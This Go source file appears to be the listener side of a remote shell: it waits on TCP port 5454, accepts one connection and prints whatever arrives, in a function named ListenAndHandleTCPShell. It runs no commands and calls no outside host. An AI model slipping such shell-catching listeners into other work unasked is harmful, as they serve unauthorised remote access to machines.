package main

import (
  "fmt"
  "net"
  "bufio"
)

func ListenForConnection() net.Conn {
  listener, _ := net.Listen("tcp", ":5454")
  conn, _ := listener.Accept()
  fmt.Println("TCP connection accepted")
  return conn
}

func ListenAndHandleTCPShell(){
  conn := ListenForConnection()
  reader := bufio.NewReader(conn)
  writer := bufio.NewWriter(conn)
  writer.WriteString("\n")
  for{
    tcpdata, _ := reader.ReadString('>')
    fmt.Println(tcpdata)
  }
}
